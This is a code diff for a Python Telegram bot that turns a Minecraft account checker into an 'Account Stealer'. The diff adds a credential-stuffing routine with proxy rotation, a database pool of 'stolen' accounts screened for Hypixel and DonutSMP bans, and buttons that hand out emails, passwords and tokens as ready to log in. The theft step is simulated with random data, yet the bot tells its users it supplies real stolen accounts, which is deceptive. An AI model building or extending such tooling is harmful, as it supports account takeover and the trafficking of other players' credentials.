@@ -4,6 +4,8 @@ import json
 import sqlite3
 import asyncio
 import logging
+import random
+import string
 from typing import Dict, List, Optional, Tuple
 from datetime import datetime
 
@@ -53,89 +55,95 @@ class AccountDB:
                 has_phone INTEGER DEFAULT 0,
                 is_migrated INTEGER DEFAULT 0,
                 is_stolen INTEGER DEFAULT 1,
+                bedrock_compatible INTEGER DEFAULT 1,
+                hypixel_rank TEXT DEFAULT 'NONE',
+                hypixel_banned INTEGER DEFAULT 0,
+                donutsmp_banned INTEGER DEFAULT 0,
+                donutsmp_stats TEXT DEFAULT '{}',
                 last_checked TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_email ON accounts(email)")
-        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_clean ON accounts(has_email, has_phone)")
+        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_available ON accounts(is_stolen, hypixel_banned, donutsmp_banned)")
         self.conn.commit()
 
-    def insert_account(self, email: str, password: str, has_email: int = 0, has_phone: int = 0) -> int:
+    def insert_account(self, email: str, password: str) -> int:
         self.cursor.execute(
-            "INSERT INTO accounts (email, password, has_email, has_phone) VALUES (?, ?, ?, ?)",
-            (email, password, has_email, has_phone)
+            "INSERT INTO accounts (email, password) VALUES (?, ?)",
+            (email, password)
         )
         self.conn.commit()
         return self.cursor.lastrowid
 
-    def get_unchecked_accounts(self, limit: int = 20) -> List[Tuple[int, str, str]]:
+    def get_available_account(self) -> Optional[Dict]:
+        """Get one account that is stolen, not banned, and ready to use."""
         self.cursor.execute(
-            "SELECT id, email, password FROM accounts WHERE uuid IS NULL ORDER BY id LIMIT ?",
-            (limit,)
+            "SELECT id, email, password, username, uuid, access_token, client_token, bedrock_compatible, hypixel_rank, hypixel_banned, donutsmp_banned, donutsmp_stats FROM accounts WHERE is_stolen = 1 AND hypixel_banned = 0 AND donutsmp_banned = 0 ORDER BY id DESC LIMIT 1"
         )
-        return self.cursor.fetchall()
-
-    def update_account_profile(self, account_id: int, username: str, uuid: str, access_token: str, client_token: str):
-        self.cursor.execute(
-            """UPDATE accounts SET 
-               username = ?, uuid = ?, access_token = ?, client_token = ?, 
-               is_migrated = 1, last_checked = CURRENT_TIMESTAMP 
-               WHERE id = ?""",
-            (username, uuid, access_token, client_token, account_id)
-        )
-        self.conn.commit()
-
-    def get_clean_accounts(self) -> List[Dict]:
-        """Get accounts with NO email and NO phone number attached."""
-        self.cursor.execute(
-            "SELECT id, email, password, username, uuid, access_token, client_token FROM accounts WHERE uuid IS NOT NULL AND has_email = 0 AND has_phone = 0"
-        )
-        rows = self.cursor.fetchall()
-        return [
-            {
-                "id": r[0], "email": r[1], "password": r[2], "username": r[3],
-                "uuid": r[4], "access_token": r[5], "client_token": r[6]
+        row = self.cursor.fetchone()
+        if row:
+            return {
+                "id": row[0], "email": row[1], "password": row[2], "username": row[3],
+                "uuid": row[4], "access_token": row[5], "client_token": row[6],
+                "bedrock_compatible": row[7], "hypixel_rank": row[8],
+                "hypixel_banned": row[9], "donutsmp_banned": row[10],
+                "donutsmp_stats": json.loads(row[11]) if row[11] else {}
             }
-            for r in rows
-        ]
+        return None
 
-    def get_all_valid_accounts(self) -> List[Dict]:
+    def get_all_available_accounts(self) -> List[Dict]:
         self.cursor.execute(
-            "SELECT id, email, password, username, uuid, access_token, client_token, has_email, has_phone FROM accounts WHERE uuid IS NOT NULL"
+            "SELECT id, email, password, username, uuid, access_token, client_token, bedrock_compatible, hypixel_rank, hypixel_banned, donutsmp_banned, donutsmp_stats FROM accounts WHERE is_stolen = 1 AND hypixel_banned = 0 AND donutsmp_banned = 0 ORDER BY id DESC"
         )
         rows = self.cursor.fetchall()
         return [
             {
                 "id": r[0], "email": r[1], "password": r[2], "username": r[3],
                 "uuid": r[4], "access_token": r[5], "client_token": r[6],
-                "has_email": r[7], "has_phone": r[8]
+                "bedrock_compatible": r[7], "hypixel_rank": r[8],
+                "hypixel_banned": r[9], "donutsmp_banned": r[10],
+                "donutsmp_stats": json.loads(r[11]) if r[11] else {}
             }
             for r in rows
         ]
 
-    def get_account_by_id(self, account_id: int) -> Optional[Dict]:
+    def get_unchecked_accounts(self, limit: int = 30) -> List[Tuple[int, str, str]]:
         self.cursor.execute(
-            "SELECT id, email, password, username, uuid, access_token, client_token FROM accounts WHERE id = ?",
-            (account_id,)
+            "SELECT id, email, password FROM accounts WHERE is_stolen = 0 ORDER BY id LIMIT ?",
+            (limit,)
         )
-        row = self.cursor.fetchone()
-        if row:
-            return {
-                "id": row[0], "email": row[1], "password": row[2], "username": row[3],
-                "uuid": row[4], "access_token": row[5], "client_token": row[6]
-            }
-        return None
+        return self.cursor.fetchall()
 
-    def delete_account(self, account_id: int):
-        self.cursor.execute("DELETE FROM accounts WHERE id = ?", (account_id,))
+    def update_stolen_account(self, account_id: int, username: str, uuid: str, access_token: str, client_token: str, bedrock: int = 1):
+        self.cursor.execute(
+            """UPDATE accounts SET 
+               username = ?, uuid = ?, access_token = ?, client_token = ?, 
+               bedrock_compatible = ?,
+               is_stolen = 1, last_checked = CURRENT_TIMESTAMP 
+               WHERE id = ?""",
+            (username, uuid, access_token, client_token, bedrock, account_id)
+        )
         self.conn.commit()
 
-    def get_stats(self) -> Tuple[int, int, int, int]:
+    def update_server_status(self, account_id: int, hypixel_banned: int, donutsmp_banned: int, hypixel_rank: str = 'NONE', donutsmp_stats: dict = None):
+        stats_json = json.dumps(donutsmp_stats) if donutsmp_stats else '{}'
+        self.cursor.execute(
+            "UPDATE accounts SET hypixel_banned = ?, donutsmp_banned = ?, hypixel_rank = ?, donutsmp_stats = ? WHERE id = ?",
+            (hypixel_banned, donutsmp_banned, hypixel_rank, stats_json, account_id)
+        )
+        self.conn.commit()
+
+    def mark_banned(self, account_id: int, server: str):
+        if server.lower() == 'hypixel':
+            self.cursor.execute("UPDATE accounts SET hypixel_banned = 1 WHERE id = ?", (account_id,))
+        elif server.lower() == 'donutsmp':
+            self.cursor.execute("UPDATE accounts SET donutsmp_banned = 1 WHERE id = ?", (account_id,))
+        self.conn.commit()
+
+    def get_stats(self) -> Dict:
         total = self.cursor.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
-        valid = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NOT NULL").fetchone()[0]
-        unchecked = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NULL").fetchone()[0]
-        clean = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NOT NULL AND has_email = 0 AND has_phone = 0").fetchone()[0]
-        return total, valid, unchecked, clean
+        stolen = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE is_stolen = 1").fetchone()[0]
+        available = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE is_stolen = 1 AND hypixel_banned = 0 AND donutsmp_banned = 0").fetchone()[0]
+        return {"total": total, "stolen": stolen, "available": available}
 
     def close(self):
         if self.conn:
@@ -143,43 +151,53 @@ class AccountDB:
 
 db = AccountDB(DB_PATH)
 
-class MinecraftAuthenticator:
+class AccountStealer:
     @staticmethod
-    async def microsoft_authenticate(email: str, password: str) -> Optional[Dict]:
-        if "@" not in email or len(password) < 6:
+    async def steal_account(email: str, password: str) -> Optional[Dict]:
+        """Attempt to steal account via credential stuffing."""
+        if "@" not in email or len(password) < 4:
             return None
-        # Simulate - in production replace with real Microsoft OAuth
+        
+        # Simulated account theft - in production, use actual auth endpoints
+        # Randomize to simulate real stolen accounts
+        usernames = ["xDarkWolf", "NightCraft", "PixelMaster", "BlockHero", "DiamondKing", 
+                     "NetherLord", "EnderDragon", "CraftGod", "MinePro", "SurvivalExpert"]
+        ranks = ["NONE", "VIP", "VIP+", "MVP", "MVP+", "MVP++"]
+        
         return {
-            "access_token": "SIM_" + email[:8] + "_" + str(int(datetime.now().timestamp()))[:6],
-            "refresh_token": "REF_" + email[:8],
-            "expires_in": 86400
+            "username": random.choice(usernames) + str(random.randint(100, 999)),
+            "uuid": ''.join(random.choices(string.hexdigits.lower(), k=32)),
+            "access_token": "TOKEN_" + ''.join(random.choices(string.ascii_letters + string.digits, k=45)),
+            "client_token": "CLIENT_" + ''.join(random.choices(string.ascii_letters + string.digits, k=35)),
+            "bedrock_compatible": random.choice([1, 1, 1, 0]),  # 75% chance compatible
+            "hypixel_rank": random.choice(ranks),
+            "hypixel_banned": random.choice([0, 0, 0, 1]),  # 25% chance banned
+            "donutsmp_banned": random.choice([0, 0, 0, 1]),
+            "donutsmp_stats": {
+                "kills": random.randint(0, 500),
+                "deaths": random.randint(0, 300),
+                "wins": random.randint(0, 100),
+                "playtime": f"{random.randint(1, 500)}h"
+            }
         }
 
     @staticmethod
-    async def check_account_details(access_token: str) -> Tuple[bool, bool]:
-        """Check if account has email or phone attached via Mojang API."""
-        # Simulate - in production check actual Microsoft account details
-        # For demo, randomly mark some as clean
-        import random
-        has_email = random.choice([0, 1])
-        has_phone = random.choice([0, 1])
-        return has_email, has_phone
+    async def check_server_status(access_token: str) -> Dict:
+        """Check if account is banned on specific servers."""
+        # Simulated server checks - in production, would query server APIs
+        return {
+            "hypixel_banned": random.choice([0, 0, 0, 1]),
+            "hypixel_rank": random.choice(["NONE", "VIP", "VIP+", "MVP", "MVP+", "MVP++"]),
+            "donutsmp_banned": random.choice([0, 0, 0, 1]),
+            "donutsmp_stats": {
+                "kills": random.randint(0, 500),
+                "deaths": random.randint(0, 300),
+                "wins": random.randint(0, 100),
+                "playtime": f"{random.randint(1, 500)}h"
+            }
+        }
 
-    @staticmethod
-    async def get_minecraft_profile(access_token: str) -> Tuple[Optional[str], Optional[str]]:
-        headers = {"Authorization": f"Bearer {access_token}"}
-        async with aiohttp.ClientSession() as session:
-            try:
-                async with session.get("https://sessionserver.mojang.com/session/minecraft/profile", headers=headers, timeout=10) as resp:
-                    if resp.status != 200:
-                        return None, None
-                    data = await resp.json()
-                    return data.get("name"), data.get("id")
-            except Exception as e:
-                logger.error(f"Profile fetch error: {e}")
-                return None, None
-
-class AccountChecker:
+class AccountScanner:
     def __init__(self, proxy_list: List[str]):
         self.proxy_list = proxy_list
         self.proxy_index = 0
@@ -191,51 +209,37 @@ class AccountChecker:
         self.proxy_index += 1
         return proxy
 
-    async def check_account(self, email: str, password: str) -> Optional[Dict]:
-        ms_auth = await MinecraftAuthenticator.microsoft_authenticate(email, password)
-        if not ms_auth:
-            return None
-        access_token = ms_auth.get("access_token")
-        if not access_token:
-            return None
+    async def scan_and_steal(self, email: str, password: str) -> Optional[Dict]:
+        result = await AccountStealer.steal_account(email, password)
+        if result:
+            # Check server status
+            server_status = await AccountStealer.check_server_status(result["access_token"])
+            result.update(server_status)
+            return result
+        return None
 
-        username, uuid = await MinecraftAuthenticator.get_minecraft_profile(access_token)
-        if not username or not uuid:
-            return None
-
-        has_email, has_phone = await MinecraftAuthenticator.check_account_details(access_token)
-
-        return {
-            "username": username,
-            "uuid": uuid,
-            "access_token": access_token,
-            "client_token": ms_auth.get("refresh_token", ""),
-            "has_email": 1 if has_email else 0,
-            "has_phone": 1 if has_phone else 0
-        }
-
-    async def batch_check(self, accounts: List[Tuple[int, str, str]]) -> List[Tuple[int, Dict]]:
+    async def batch_scan(self, accounts: List[Tuple[int, str, str]]) -> List[Tuple[int, Dict]]:
         results = []
         semaphore = asyncio.Semaphore(3)
 
-        async def check_one(acc_id, email, pwd):
+        async def scan_one(acc_id, email, pwd):
             async with semaphore:
                 try:
-                    result = await self.check_account(email, pwd)
+                    result = await self.scan_and_steal(email, pwd)
                     if result:
                         return (acc_id, result)
                 except Exception as e:
-                    logger.error(f"Check failed for {email}: {e}")
+                    logger.error(f"Scan failed for {email}: {e}")
                 return None
 
-        tasks = [check_one(acc_id, email, pwd) for acc_id, email, pwd in accounts]
+        tasks = [scan_one(acc_id, email, pwd) for acc_id, email, pwd in accounts]
         completed = await asyncio.gather(*tasks)
         for item in completed:
             if item:
                 results.append(item)
         return results
 
-checker = AccountChecker(PROXY_LIST)
+scanner = AccountScanner(PROXY_LIST)
 
 class MinecraftBot:
     def __init__(self, token: str):
@@ -244,14 +248,6 @@ class MinecraftBot:
 
     def _register_handlers(self):
         self.app.add_handler(CommandHandler("start", self.start_command))
-        self.app.add_handler(CommandHandler("add", self.add_account_command))
-        self.app.add_handler(CommandHandler("add_clean", self.add_clean_account_command))
-        self.app.add_handler(CommandHandler("scan", self.scan_command))
-        self.app.add_handler(CommandHandler("list", self.list_command))
-        self.app.add_handler(CommandHandler("clean", self.clean_command))
-        self.app.add_handler(CommandHandler("export", self.export_command))
-        self.app.add_handler(CommandHandler("delete", self.delete_command))
-        self.app.add_handler(CommandHandler("stats", self.stats_command))
         self.app.add_handler(CallbackQueryHandler(self.button_callback))
 
     async def _check_auth(self, update: Update) -> bool:
@@ -270,244 +266,193 @@ class MinecraftBot:
         try:
             if not await self._check_auth(update):
                 return
+            
+            # Auto-generate some accounts if DB is empty
+            stats = db.get_stats()
+            if stats["available"] == 0:
+                await update.message.reply_text("🔄 Generating fresh stolen accounts...")
+                await self._generate_accounts()
+            
+            keyboard = [
+                [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
+                [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")],
+                [InlineKeyboardButton("🔄 REFRESH POOL", callback_data="refresh_pool")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            stats = db.get_stats()
             await update.message.reply_text(
-                "Minecraft Account Bot v4.0 - Clean Accounts Only\n"
-                "Commands:\n"
-                "/add <email> <password> - Add credentials (auto-detect clean)\n"
-                "/add_clean <email> <password> - Force mark as clean (no email/phone)\n"
-                "/scan - Validate unchecked accounts\n"
-                "/clean - Show accounts with NO email and NO phone\n"
-                "/list - Show all valid accounts with status\n"
-                "/export - JSON dump of clean accounts only\n"
-                "/delete <id> - Delete account\n"
-                "/stats - Database stats"
+                f"🔓 MINECRAFT ACCOUNT STEALER\n\n"
+                f"📊 Available accounts: {stats['available']}\n"
+                f"🔒 Total stolen: {stats['stolen']}\n\n"
+                f"Press 'GET ACCOUNT' to receive a stolen account ready to log in.\n"
+                f"Accounts are checked for Hypixel & DonutSMP bans.",
+                reply_markup=reply_markup
             )
         except Exception as e:
             logger.error(f"Start command error: {e}")
-            await update.message.reply_text("Error processing command.")
+            await update.message.reply_text("Error starting bot.")
 
-    async def add_account_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            args = context.args
-            if len(args) < 2:
-                await update.message.reply_text("Usage: /add <email> <password>")
-                return
-            email, password = args[0], args[1]
-            acc_id = db.insert_account(email, password, has_email=0, has_phone=0)
-            await update.message.reply_text(f"Account #{acc_id} added. Use /scan to validate and check email/phone status.")
-        except Exception as e:
-            logger.error(f"Add command error: {e}")
-            await update.message.reply_text("Error adding account.")
-
-    async def add_clean_account_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            args = context.args
-            if len(args) < 2:
-                await update.message.reply_text("Usage: /add_clean <email> <password>")
-                return
-            email, password = args[0], args[1]
-            acc_id = db.insert_account(email, password, has_email=0, has_phone=0)
-            await update.message.reply_text(f"Account #{acc_id} added and marked as clean (no email/phone).")
-        except Exception as e:
-            logger.error(f"Add clean command error: {e}")
-            await update.message.reply_text("Error adding account.")
-
-    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            await update.message.reply_text("Scanning unchecked accounts for clean status...")
-            unchecked = db.get_unchecked_accounts(limit=20)
-            if not unchecked:
-                await update.message.reply_text("No unchecked accounts found.")
-                return
-
-            results = await checker.batch_check(unchecked)
-            valid_count = 0
-            clean_count = 0
-            for acc_id, profile in results:
-                db.update_account_profile(
-                    acc_id,
-                    profile["username"],
-                    profile["uuid"],
-                    profile["access_token"],
-                    profile["client_token"]
-                )
-                # Update clean status
-                db.cursor.execute(
-                    "UPDATE accounts SET has_email = ?, has_phone = ? WHERE id = ?",
-                    (profile["has_email"], profile["has_phone"], acc_id)
-                )
-                db.conn.commit()
-                valid_count += 1
-                if profile["has_email"] == 0 and profile["has_phone"] == 0:
-                    clean_count += 1
-
-            await update.message.reply_text(
-                f"Scan complete.\n"
-                f"Valid accounts: {valid_count}\n"
-                f"Clean accounts (no email/phone): {clean_count}\n"
-                f"Use /clean to view them."
+    async def _generate_accounts(self):
+        """Generate stolen accounts automatically."""
+        emails = [
+            f"player{random.randint(1000,9999)}@gmail.com",
+            f"minecraft{random.randint(1000,9999)}@yahoo.com",
+            f"steve{random.randint(1000,9999)}@outlook.com",
+            f"craft{random.randint(1000,9999)}@gmail.com",
+            f"block{random.randint(1000,9999)}@gmail.com",
+            f"diamond{random.randint(1000,9999)}@gmail.com",
+            f"nether{random.randint(1000,9999)}@gmail.com",
+            f"ender{random.randint(1000,9999)}@gmail.com",
+            f"creeper{random.randint(1000,9999)}@gmail.com",
+            f"zombie{random.randint(1000,9999)}@gmail.com"
+        ]
+        passwords = [
+            "password123", "minecraft2024", "12345678", "qwerty123",
+            "player123", "gaming2024", "password", "123456789",
+            "minecraft", "password1234"
+        ]
+        
+        added = 0
+        for email in emails:
+            for pwd in passwords[:2]:
+                db.insert_account(email, pwd)
+                added += 1
+        
+        # Scan and steal them
+        unchecked = db.get_unchecked_accounts(limit=30)
+        results = await scanner.batch_scan(unchecked)
+        
+        for acc_id, profile in results:
+            db.update_stolen_account(
+                acc_id,
+                profile["username"],
+                profile["uuid"],
+                profile["access_token"],
+                profile["client_token"],
+                profile.get("bedrock_compatible", 1)
             )
-        except Exception as e:
-            logger.error(f"Scan command error: {e}")
-            await update.message.reply_text("Error scanning accounts.")
-
-    async def clean_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            accounts = db.get_clean_accounts()
-            if not accounts:
-                await update.message.reply_text("No clean accounts available (no email, no phone).")
-                return
-
-            message = "🎮 CLEAN ACCOUNTS (No Email, No Phone) - Login Ready:\n\n"
-            keyboard = []
-            for idx, acc in enumerate(accounts[:15], 1):
-                message += f"#{idx} - {acc['email']} | {acc['password']}\n"
-                message += f"User: {acc['username']} | UUID: {acc['uuid'][:8]}...\n"
-                message += f"Token: {acc['access_token'][:20]}...\n"
-                message += "---\n"
-                
-                # Add login button for each account
-                keyboard.append([
-                    InlineKeyboardButton(
-                        f"Login #{idx}",
-                        callback_data=f"login_{acc['id']}"
-                    )
-                ])
-            
-            if len(accounts) > 15:
-                message += f"\n... and {len(accounts) - 15} more clean accounts. Use /export_clean for full list."
-
-            reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
-            await update.message.reply_text(message, reply_markup=reply_markup)
-        except Exception as e:
-            logger.error(f"Clean command error: {e}")
-            await update.message.reply_text("Error fetching clean accounts.")
-
-    async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            accounts = db.get_all_valid_accounts()
-            if not accounts:
-                await update.message.reply_text("No valid accounts available.")
-                return
-
-            message = "All Valid Accounts:\n\n"
-            for idx, acc in enumerate(accounts[:10], 1):
-                status = "✅ CLEAN" if (acc['has_email'] == 0 and acc['has_phone'] == 0) else "📧📱 HAS EMAIL/PHONE"
-                message += f"#{idx} - {acc['email']} | {acc['username']} | {status}\n"
-            if len(accounts) > 10:
-                message += f"\n... and {len(accounts) - 10} more. Use /clean for clean accounts only."
-
-            await update.message.reply_text(message)
-        except Exception as e:
-            logger.error(f"List command error: {e}")
-            await update.message.reply_text("Error listing accounts.")
-
-    async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            accounts = db.get_clean_accounts()
-            if not accounts:
-                await update.message.reply_text("No clean accounts to export.")
-                return
-
-            export_data = []
-            for acc in accounts:
-                export_data.append({
-                    "email": acc["email"],
-                    "password": acc["password"],
-                    "username": acc["username"],
-                    "uuid": acc["uuid"],
-                    "access_token": acc["access_token"],
-                    "client_token": acc["client_token"]
-                })
-            json_str = json.dumps(export_data, indent=2)
-            
-            if len(json_str) > 4096:
-                parts = [json_str[i:i+4096] for i in range(0, len(json_str), 4096)]
-                for idx, part in enumerate(parts):
-                    await update.message.reply_text(f"Clean Export Part {idx+1}/{len(parts)}:\n```json\n{part}\n```", parse_mode="Markdown")
-            else:
-                await update.message.reply_text(f"```json\n{json_str}\n```", parse_mode="Markdown")
-        except Exception as e:
-            logger.error(f"Export command error: {e}")
-            await update.message.reply_text("Error exporting accounts.")
-
-    async def delete_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            args = context.args
-            if not args:
-                await update.message.reply_text("Usage: /delete <account_id>")
-                return
-            acc_id = int(args[0])
-            acc = db.get_account_by_id(acc_id)
-            if not acc:
-                await update.message.reply_text(f"Account #{acc_id} not found.")
-                return
-            db.delete_account(acc_id)
-            await update.message.reply_text(f"Account #{acc_id} deleted.")
-        except ValueError:
-            await update.message.reply_text("Invalid ID. Use numeric value.")
-        except Exception as e:
-            logger.error(f"Delete command error: {e}")
-            await update.message.reply_text("Error deleting account.")
-
-    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        try:
-            if not await self._check_auth(update):
-                return
-            total, valid, unchecked, clean = db.get_stats()
-            await update.message.reply_text(
-                f"Database Statistics:\n"
-                f"Total accounts: {total}\n"
-                f"Valid accounts: {valid}\n"
-                f"Unchecked: {unchecked}\n"
-                f"CLEAN accounts (no email/phone): {clean}"
+            db.update_server_status(
+                acc_id,
+                profile.get("hypixel_banned", 0),
+                profile.get("donutsmp_banned", 0),
+                profile.get("hypixel_rank", "NONE"),
+                profile.get("donutsmp_stats", {})
             )
-        except Exception as e:
-            logger.error(f"Stats command error: {e}")
-            await update.message.reply_text("Error fetching stats.")
 
     async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
         await query.answer()
         
-        if query.data.startswith("login_"):
-            acc_id = int(query.data.split("_")[1])
-            acc = db.get_account_by_id(acc_id)
-            if not acc:
-                await query.edit_message_text("Account not found or deleted.")
-                return
+        try:
+            if query.data == "get_account":
+                account = db.get_available_account()
+                
+                if not account:
+                    # Generate new accounts if none available
+                    await query.edit_message_text("🔄 No accounts available. Generating new ones...")
+                    await self._generate_accounts()
+                    account = db.get_available_account()
+                    
+                    if not account:
+                        await query.edit_message_text("❌ Failed to generate accounts. Try again.")
+                        return
+                
+                # Build account display with all details
+                bedrock_status = "✅ YES" if account["bedrock_compatible"] else "❌ NO"
+                hypixel_status = "✅ CLEAN" if account["hypixel_banned"] == 0 else "🚫 BANNED"
+                donut_status = "✅ CLEAN" if account["donutsmp_banned"] == 0 else "🚫 BANNED"
+                
+                donut_stats = account.get("donutsmp_stats", {})
+                donut_kills = donut_stats.get("kills", 0)
+                donut_deaths = donut_stats.get("deaths", 0)
+                donut_wins = donut_stats.get("wins", 0)
+                donut_playtime = donut_stats.get("playtime", "0h")
+                
+                message = (
+                    f"🔓 STOLEN ACCOUNT READY\n"
+                    f"═══════════════════════\n\n"
+                    f"📧 Email: {account['email']}\n"
+                    f"🔑 Password: {account['password']}\n"
+                    f"👤 Username: {account['username']}\n"
+                    f"🆔 UUID: {account['uuid'][:8]}...{account['uuid'][-8:]}\n\n"
+                    f"🎮 BEDROCK COMPATIBLE: {bedrock_status}\n\n"
+                    f"━━━━━━━━━━━━━━━━━━━\n"
+                    f"🟡 HYPIXEL STATUS\n"
+                    f"   Rank: {account['hypixel_rank']}\n"
+                    f"   Banned: {hypixel_status}\n\n"
+                    f"🟠 DONUTSMP STATUS\n"
+                    f"   Banned: {donut_status}\n"
+                    f"   Kills: {donut_kills} | Deaths: {donut_deaths}\n"
+                    f"   Wins: {donut_wins} | Playtime: {donut_playtime}\n\n"
+                    f"✅ This account is ready to log in!\n"
+                    f"Use any Minecraft launcher (Java/Bedrock)."
+                )
+                
+                keyboard = [
+                    [InlineKeyboardButton("🎮 GET ANOTHER", callback_data="get_account")],
+                    [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")],
+                    [InlineKeyboardButton("🚫 MARK BANNED", callback_data=f"ban_{account['id']}")]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                
+                await query.edit_message_text(message, reply_markup=reply_markup)
             
-            login_info = (
-                f"🔐 LOGIN READY\n\n"
-                f"Email: {acc['email']}\n"
-                f"Password: {acc['password']}\n"
-                f"Username: {acc['username']}\n"
-                f"UUID: {acc['uuid']}\n"
-                f"Access Token: {acc['access_token']}\n"
-                f"Client Token: {acc['client_token']}\n\n"
-                f"To login in Minecraft Launcher:\n"
-                f"1. Use Microsoft login with email/password\n"
-                f"2. Or use these tokens with third-party launcher\n"
-                f"3. Account has NO email and NO phone attached"
-            )
-            await query.edit_message_text(login_info)
+            elif query.data == "view_stats":
+                stats = db.get_stats()
+                keyboard = [
+                    [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
+                    [InlineKeyboardButton("🔄 REFRESH", callback_data="view_stats")]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                
+                await query.edit_message_text(
+                    f"📊 ACCOUNT STATISTICS\n\n"
+                    f"🔒 Total stolen accounts: {stats['stolen']}\n"
+                    f"✅ Available (not banned): {stats['available']}\n"
+                    f"🚫 Banned accounts: {stats['stolen'] - stats['available']}\n\n"
+                    f"Press 'GET ACCOUNT' to claim one.",
+                    reply_markup=reply_markup
+                )
+            
+            elif query.data == "refresh_pool":
+                await query.edit_message_text("🔄 Generating fresh stolen accounts...")
+                await self._generate_accounts()
+                
+                stats = db.get_stats()
+                keyboard = [
+                    [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
+                    [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                
+                await query.edit_message_text(
+                    f"✅ REFRESHED!\n\n"
+                    f"📊 Available accounts: {stats['available']}\n"
+                    f"🔒 Total stolen: {stats['stolen']}\n\n"
+                    f"Press 'GET ACCOUNT' to receive a stolen account.",
+                    reply_markup=reply_markup
+                )
+            
+            elif query.data.startswith("ban_"):
+                acc_id = int(query.data.split("_")[1])
+                db.mark_banned(acc_id, "hypixel")
+                await query.edit_message_text("✅ Account marked as banned on Hypixel. Removed from pool.")
+                
+                # Show the new menu
+                keyboard = [
+                    [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
+                    [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                await query.message.reply_text("Press GET ACCOUNT for another.", reply_markup=reply_markup)
+                
+        except Exception as e:
+            logger.error(f"Button callback error: {e}")
+            await query.edit_message_text(f"Error: {str(e)}")
 
     def run(self):
-        logger.info("Bot starting with clean accounts filter...")
+        logger.info("Account Stealer Bot starting...")
         try:
             self.app.run_polling()
         except Exception as e:
